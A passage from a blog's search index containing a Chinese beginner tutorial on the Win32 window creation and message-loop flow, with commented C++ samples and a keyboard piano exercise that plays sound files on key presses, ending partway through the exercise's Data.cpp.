<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Windows-SDK</title>
      <link href="/2022/11/24/Windows-SDK/"/>
      <url>/2022/11/24/Windows-SDK/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Windows窗口的创建流程"><a href="#Windows窗口的创建流程" class="headerlink" title="Windows窗口的创建流程"></a>Windows窗口的创建流程</h1><h2 id="注册一个窗口类"><a href="#注册一个窗口类" class="headerlink" title="注册一个窗口类"></a>注册一个窗口类</h2><p>RegisterClass</p><p>1.1、提供一个消息处理函数（窗口回调函数）</p><p>1.2、提供一个窗口类的名字</p><h2 id="创建一个窗口"><a href="#创建一个窗口" class="headerlink" title="创建一个窗口"></a>创建一个窗口</h2><p> GreateWindow 能够创建一个窗口，得到一个窗口句柄，是系统找到串口的一个标识</p><h2 id="更新显示窗口"><a href="#更新显示窗口" class="headerlink" title="更新显示窗口"></a>更新显示窗口</h2><p>UpdateWindow（更新）</p><p>Show Window（显示）</p><h2 id="编写一个消息循环"><a href="#编写一个消息循环" class="headerlink" title="编写一个消息循环"></a>编写一个消息循环</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">While(GetMessage)(…))&#123;</span><br><span class="line">TranslateMessage();</span><br><span class="line">DispatchMessage(…);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编写一个消息处理函数（窗口回调函数）"><a href="#编写一个消息处理函数（窗口回调函数）" class="headerlink" title="编写一个消息处理函数（窗口回调函数）"></a>编写一个消息处理函数（窗口回调函数）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DWORD WINAPI WndProc(HWND hWnd,int nMessage,WPARAM wParam,LPARAM lParam)&#123;</span><br><span class="line">Switch(message)&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>问题1：*</strong>怎么理解这一些代码，这个过程这段代码，是定形式，是微软规定好的流程*</p><p><strong>问题2：*</strong>消息是怎么获取到的*</p><p>只有窗口才能够收消息，窗口收的息，需要通过 GetMessage来从程序的消息队列中获取到。你需要创建一个窗口，然后在创建窗口之后就可以使用 GetMessage获得创建的窗口收到的消息</p><p><strong>问题3：*</strong>消息队列在哪里，我为什么看不到？？*</p><p>因为大部分的事情都是操作系统帮你完成了比如说消息队列，比如往消息队列添加消息，从消息队列中得到消息，删除已经得到的</p><p><strong>问题4：*</strong>什么是回调函数？谁调用了回调函数？*</p><p>回调函数就不是你调用的函数你提供了一个函数给操作系统，操作系统在合适的时机去调用你提供的函数。因为只有操作系统才能知道什么时候得到了消息，只有我才知道我的程序怎么处理消息</p><p><strong>问题5：*</strong>为什么创建窗口要先注册窗口类？为什么创建完窗口要写更新显示窗口？为什么消息循环要写 tMessage DispatchMessage并放在一个循环里面？？*需要先有一个板（窗口共有一些特性，放在窗口类里面），然后创建窗口的时候根据模板去创建</p><p>刚创建出来的窗口是隐藏起来的，比如 ShowWindow给显示出来， UpdateWindow能够让窗口产生一次自绘（WMPAINT）</p><p>的作用就是从滴息队列中获取消息</p><p>DispatchMessage的作用就是调用口相对应的回调函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//用于在调试窗口输出信息</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">trace</span><span class="params">(CONST TCHAR* format, ...)</span><span class="comment">//变参函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR buffer[<span class="number">1000</span>];</span><br><span class="line">va_list argptr;</span><br><span class="line"><span class="built_in">va_start</span>(argptr,format);</span><br><span class="line"><span class="comment">//将格式化信息写入指定缓冲区</span></span><br><span class="line"><span class="built_in">wvsprintf</span>(buffer, format, argptr);</span><br><span class="line"><span class="built_in">va_end</span>(argptr);</span><br><span class="line"><span class="comment">//将缓冲区信息输出</span></span><br><span class="line"><span class="built_in">OutputDebugString</span>(buffer);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//必须提供窗口回调函数</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HWND hWnd,<span class="comment">//哪个串口的消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">UINT uMsg,<span class="comment">//消息的类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">LPARAM lParam<span class="comment">//消息的附加参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//使用分支语句处理要操作的消息</span></span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:<span class="comment">//窗口创建消息，第一个被产生 的消息</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, <span class="string">L&quot;打开成功&quot;</span>, <span class="string">L&quot;标题&quot;</span>, MB_OK);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//右上角关闭按钮</span></span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, <span class="string">L&quot;确认是否关闭&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line"><span class="comment">//销毁当前窗口</span></span><br><span class="line"><span class="built_in">DestroyWindow</span>(hWnd);</span><br><span class="line"><span class="comment">//结束消息循环</span></span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//窗口移动消息，移动窗口位置响应</span></span><br><span class="line"><span class="keyword">case</span> WM_MOVE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//lParam保存左上角坐标</span></span><br><span class="line">WORD x = <span class="built_in">LOWORD</span>(lParam);</span><br><span class="line">WORD y = <span class="built_in">HIWORD</span>(lParam);</span><br><span class="line"><span class="built_in">trace</span>(<span class="string">L&quot;POS(%d,%d)\n&quot;</span>, x, y);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将不想处理的消息传递给这个函数，进行默认参数</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd,uMsg,wParam,lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">trace</span>(<span class="string">L&quot;一次调用&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HINSTANCE hInstance,<span class="comment">//实例句柄，表示当前应用程序，用于获取资源</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HINSTANCE hPrevInstance,<span class="comment">//句柄，标识上一个打开的应用程序</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ LPSTR lpCmdLine,<span class="comment">//命令行参数，对应的是main函数的argv参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ <span class="type">int</span> nCmdShow<span class="comment">//显示方式，最大化最小化</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">prin</span>();</span><br><span class="line"><span class="comment">//1、创建窗口类，</span></span><br><span class="line">WNDCLASS WnsClass = &#123;<span class="number">0</span>&#125;;<span class="comment">//窗口结构体初始化为0</span></span><br><span class="line">WnsClass.lpfnWndProc = WndProc;<span class="comment">//一个回调函数的地址</span></span><br><span class="line">WnsClass.lpszClassName = <span class="string">L&quot;myclass&quot;</span>;<span class="comment">//结构体名字，表示当前的窗口，由于是宽字符</span></span><br><span class="line">WnsClass.hCursor = <span class="built_in">LoadCursor</span>(<span class="literal">NULL</span>, IDC_ARROW);<span class="comment">//使用默认光标</span></span><br><span class="line">WnsClass.style = CS_VREDRAW | CS_HREDRAW;<span class="comment">//窗口改变大小后重绘制</span></span><br><span class="line">WnsClass.hInstance = hInstance;<span class="comment">//标识当前应用程序</span></span><br><span class="line">WnsClass.hIcon = <span class="built_in">LoadIcon</span>(<span class="literal">NULL</span>,IDI_APPLICATION);<span class="comment">//使用默认图标</span></span><br><span class="line">WnsClass.hbrBackground = <span class="built_in">CreateSolidBrush</span>(<span class="built_in">RGB</span>(<span class="number">0</span>, <span class="number">0xff</span>, <span class="number">0</span>));<span class="comment">//背景颜色</span></span><br><span class="line">WnsClass.cbWndExtra = WnsClass.cbClsExtra = <span class="number">0</span>;<span class="comment">//扩展，几乎没有用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2、注册已经注册好的窗口，注册后的窗口才能使用</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">RegisterClass</span>(&amp;WnsClass))<span class="comment">//传入需要注册的结构体地址</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;打开失败&quot;</span>, <span class="string">L&quot;错误&quot;</span>, MB_OK | MB_ICONERROR);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3通过设置好的窗口来创建</span></span><br><span class="line">HWND hWnd=<span class="built_in">CreateWindow</span>(<span class="comment">//返回值是一个窗口句柄</span></span><br><span class="line"><span class="string">L&quot;myclass&quot;</span>,<span class="comment">//使用注册好的窗口类</span></span><br><span class="line"><span class="string">L&quot;第一个窗口&quot;</span>,<span class="comment">//窗口的显示名称</span></span><br><span class="line">WS_OVERLAPPEDWINDOW,<span class="comment">//窗口显示类型：重叠窗口</span></span><br><span class="line">CW_USEDEFAULT, <span class="number">0</span>,<span class="comment">//窗口左上角的坐标，使用CW_USEDEFAULT,可以省略y</span></span><br><span class="line">CW_USEDEFAULT, <span class="number">0</span>,<span class="comment">//窗口的高度和宽度，使用CW_USEDEFAULT，可以省略宽度</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//当前的窗口的副窗口</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//菜单句柄，标识当前使用哪个菜单</span></span><br><span class="line">hInstance,<span class="comment">//实例句柄，表示当前窗口属于哪个应用程序</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4、显示并更新窗口</span></span><br><span class="line"><span class="built_in">ShowWindow</span>(hWnd, SW_SHOWNORMAL);<span class="comment">//默认不显示，所以，我们需要手动显示</span></span><br><span class="line"><span class="built_in">UpdateWindow</span>(hWnd);</span><br><span class="line"></span><br><span class="line"><span class="comment">//5、编写消息循环</span></span><br><span class="line">MSG msg = &#123; <span class="number">0</span> &#125;;<span class="comment">//保存消息的结构体</span></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(</span><br><span class="line">&amp;msg,<span class="comment">//保存信息来源的结构体</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//窗口句柄，指定当前接收哪个窗口的消息，NULL表示所有</span></span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>))<span class="comment">//表示想要接收消息的范围0，表示所有</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//将消息结构体中的前四个参数传递给对应窗口类中填写 的回调函数</span></span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="二、练习题"><a href="#二、练习题" class="headerlink" title="二、练习题"></a>二、练习题</h1><h2 id="题：钢琴"><a href="#题：钢琴" class="headerlink" title="题：钢琴"></a>题：钢琴</h2><p>描述：使用所提供的音乐资源写出可以根据按键弹奏播放对应的曲调</p><p>进阶：本地提供一个钢琴谱，根据琴谱自动弹奏</p><h3 id="main-cpp-主函数"><a href="#main-cpp-主函数" class="headerlink" title="main.cpp//主函数"></a>main.cpp//主函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Data.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;winmm.lib&quot;</span>)</span></span><br><span class="line"><span class="comment">//用宏自定义消息类型</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UM_MYMESSAGE WM_USER+1</span></span><br><span class="line"><span class="comment">//声明</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">en_zch</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//设置英文输入法</span></span><br><span class="line"><span class="built_in">keybd_event</span>(VK_SHIFT, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">keybd_event</span>(VK_SHIFT, <span class="number">0</span>, KEYEVENTF_KEYUP, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,HINSTANCE hPronstance, LPSTR lpCmdLine,<span class="type">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//注册窗口</span></span><br><span class="line">WNDCLASS ws = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">ws.lpfnWndProc= WndProc;</span><br><span class="line">ws.hInstance=hInstance;</span><br><span class="line">ws.lpszClassName = <span class="string">L&quot;piano&quot;</span>;</span><br><span class="line"><span class="built_in">RegisterClass</span>(&amp;ws);</span><br><span class="line"><span class="comment">//创建窗口</span></span><br><span class="line">HWND hwnd=<span class="built_in">CreateWindow</span>(<span class="string">L&quot;piano&quot;</span>, <span class="string">L&quot;钢琴&quot;</span>, WS_OVERLAPPEDWINDOW , <span class="number">500</span>, <span class="number">500</span>, <span class="number">800</span>, <span class="number">800</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//更新显示窗口</span></span><br><span class="line"><span class="built_in">UpdateWindow</span>(hwnd);</span><br><span class="line"><span class="built_in">ShowWindow</span>(hwnd,SW_SHOWNORMAL);</span><br><span class="line"><span class="comment">//消息泵</span></span><br><span class="line">MSG msg = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//必须提供窗口回调函数</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HWND hWnd,<span class="comment">//哪个串口的消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">UINT uMsg,<span class="comment">//消息的类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">WPARAM wParam,<span class="comment">//虚拟键值</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPARAM lParam<span class="comment">//消息的附加参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//创建Data对象</span></span><br><span class="line">Data obj;</span><br><span class="line"><span class="comment">//使用分支语句处理要操作的消息</span></span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">&#123;<span class="comment">//开场音乐</span></span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\LoopyMusic.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (obj.<span class="built_in">ReadData</span>(hWnd))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, <span class="string">L&quot;检测到你有琴谱，是否播放&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK|MB_OKCANCEL);</span><br><span class="line"><span class="built_in">PostMessage</span>(hWnd, UM_MYMESSAGE,<span class="number">0</span>,<span class="number">0</span>);<span class="comment">//给自定义消息发送</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//自定义响应消息</span></span><br><span class="line"><span class="keyword">case</span> UM_MYMESSAGE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(Data::Souce); i++)</span><br><span class="line">&#123;</span><br><span class="line">obj.<span class="built_in">If_Case</span>(Data::Souce[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//右上角关闭按钮</span></span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, <span class="string">L&quot;是否退出钢琴&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line"><span class="comment">//销毁当前窗口</span></span><br><span class="line"><span class="built_in">DestroyWindow</span>(hWnd);</span><br><span class="line"><span class="comment">//结束消息循环</span></span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//按键按下响应</span></span><br><span class="line"><span class="keyword">case</span> WM_KEYDOWN:</span><br><span class="line">&#123;</span><br><span class="line">obj.<span class="built_in">If_Case</span>(wParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将不想处理的消息传递给这个函数，进行默认参数</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Data-h-数据类头文件，"><a href="#Data-h-数据类头文件，" class="headerlink" title="Data.h//数据类头文件，"></a>Data.h//数据类头文件，</h3><p>用于本地数据的读取及函数的封装</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Data</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//接收从本地读取到的字符</span></span><br><span class="line"><span class="type">char</span> <span class="type">static</span> Souce[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//判断传入的字符对应的播放音乐</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">If_Case</span><span class="params">(<span class="type">char</span> c_char)</span></span>;</span><br><span class="line"><span class="comment">//读取本地歌谱</span></span><br><span class="line"><span class="function">BOOL <span class="title">ReadData</span><span class="params">(HWND hwnd)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Data-cpp-数据类函数定义"><a href="#Data-cpp-数据类函数定义" class="headerlink" title="Data.cpp//数据类函数定义"></a>Data.cpp//数据类函数定义</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Data.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Data::Souce[<span class="number">50</span>] = &#123;&#125;;</span><br><span 